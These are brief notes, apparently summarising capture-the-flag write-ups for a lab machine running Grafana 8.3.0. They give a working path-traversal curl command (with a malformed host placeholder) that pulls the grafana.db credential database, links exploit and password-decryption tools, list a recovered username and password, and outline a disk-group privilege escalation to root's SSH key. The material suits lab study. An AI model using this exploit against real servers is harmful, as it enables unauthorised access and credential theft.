Summary from existing writeups:
- :3000 exposes a Grafana instance, v8.3.0 (914fcedb72)
- LFI https://www.exploit-db.com/exploits/50581
	- `curl --path-as-is http://:3000$IP/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`
- SQLite -> decrypt passwords https://github.com/jas502n/Grafana-CVE-2021-43798?source=post_page-----792d7014d7a0---------------------------------------
- `sysadmin : SuperSecureP@ssw0rd`
- https://www.hackingarticles.in/disk-group-privilege-escalation/
- get root ssh private key -> ssh as root